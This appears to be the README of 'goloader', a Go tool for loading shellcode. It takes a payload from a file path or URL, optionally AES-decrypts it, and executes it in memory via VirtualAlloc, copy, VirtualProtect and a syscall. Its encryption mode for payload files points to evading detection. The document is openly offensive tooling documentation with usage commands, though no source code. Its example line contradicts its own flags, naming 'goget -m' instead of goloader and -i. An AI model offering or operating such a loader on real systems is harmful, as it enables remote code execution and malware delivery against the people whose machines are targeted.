# goloader
a shellcode loader written in GO.

use cases:  
1. inject shellcode  
    goloader -p <file path or URL> -i <inject method (currently only syscall implemented)>  
2. decrypt (AES) and inject  
    goloader -p <file path or URL> -d <32 char long key> -i <inject method (currently only syscall implemented)>  
3. decrypt a file (if no -i it will be saved in current dir as sc.dec)  
    goloader -p <file path or URL> -d <32 char long key>  
4. encrypt a file (will be saved in current dir as sc.enc)  
    goloader -p <file path or URL> -e <32 char long key>  

Usage:  
  -d string  
        a 32 char long key used to decrypt the file  
  -e string  
        a 32 char long key used to encrypt the file  
  -i string  
        method of code injection.  
                methods are:  
                - syscall (virtualalloc READWRITE -> RTLCOPY -> virtualprotect EXECUTRE -> syscall)  
                - thread () // not implemented  
                - proc () // not implemented  
                example:  
                goget -m syscall  

  -p string  
        path or URL to shellcode file  

